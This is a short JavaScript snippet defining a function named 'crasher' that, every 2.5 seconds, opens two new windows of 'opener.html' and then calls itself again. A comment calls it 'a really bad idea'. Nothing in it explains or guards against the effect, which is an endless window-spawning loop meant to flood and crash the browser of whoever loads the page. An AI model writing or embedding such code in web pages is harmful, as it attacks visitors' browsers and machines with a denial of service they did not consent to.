function crasher() {
  setTimeout(() => {
  window.open("opener.html")
  window.open("opener.html")
  // a really bad idea
  crasher()
}, 2500)
}
